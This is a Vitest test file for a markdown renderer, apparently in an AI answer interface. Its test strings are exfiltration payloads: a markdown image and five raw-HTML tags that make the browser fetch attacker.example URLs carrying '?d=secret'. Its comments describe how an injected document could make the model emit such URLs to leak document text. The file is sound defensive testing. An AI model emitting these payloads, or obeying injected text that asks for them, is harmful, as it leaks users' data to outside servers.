import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("renders an image as nothing", () => {
    // Arrange
    // A rendered <img> makes the browser fetch the URL, so an answer (or an
    // injected document) could leak data to an attacker's server.
    const answer = "Before ![](https://attacker.example/leak.png?d=secret) after";
    // Act
    const html = renderMarkdown(answer);
    // Assert
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
  });

  it("still renders a link", () => {
    // Arrange
    const answer = "[Reuters](https://www.reuters.com/world/)";
    // Act
    const html = renderMarkdown(answer);
    // Assert
    expect(html).toContain('<a href="https://www.reuters.com/world/"');
    expect(html).toContain(">Reuters</a>");
  });

  // Each raw-HTML vector makes the browser fetch a URL when the answer is
  // rendered. An injected document could make the model emit one carrying
  // document text in that URL.
  it.each([
    ["a video poster", '<video poster="https://attacker.example/p.png?d=secret"></video>'],
    ["an audio source", '<audio src="https://attacker.example/a.mp3?d=secret"></audio>'],
    [
      "a picture source set",
      '<picture><source srcset="https://attacker.example/s.png?d=secret"></picture>',
    ],
    [
      "a style attribute with a url",
      '<p style="background:url(https://attacker.example/b.png?d=secret)">text</p>',
    ],
    [
      "an svg image",
      '<svg><image href="https://attacker.example/i.png?d=secret"></image></svg>',
    ],
  ])("raw HTML with %s renders nothing the browser would fetch", (_name, raw) => {
    // Arrange
    const answer = `Before ${raw} after`;
    // Act
    const html = renderMarkdown(answer);
    // Assert
    expect(html).not.toContain("attacker.example");
  });
});
